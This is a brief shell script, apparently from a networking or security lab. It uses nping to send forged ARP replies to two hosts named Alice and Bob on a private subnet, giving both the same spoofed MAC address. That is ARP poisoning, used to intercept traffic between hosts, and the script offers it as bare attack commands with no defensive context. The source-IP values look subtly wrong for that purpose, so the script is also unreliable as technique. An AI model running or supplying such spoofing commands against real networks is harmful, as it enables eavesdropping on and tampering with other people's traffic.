# Define target IP and MAC addresses
bob_target_ip="172.31.0.3"
bob_target_mac="00:16:3e:3d:17:94"

# Construct the command to send ARP packet
nping --dest-ip $bob_target_ip --arp --arp-type arp-reply --source-ip $bob_target_ip --source-mac $bob_target_mac -c 1

# Define target IP and MAC addresses
alice_target_ip="172.31.0.2"
alice_target_mac="00:16:3e:3d:17:94"

# Construct the command to send ARP packet
nping --dest-ip $alice_target_ip --arp --arp-type arp-reply --source-ip $alice_target_ip --source-mac $alice_target_mac -c 1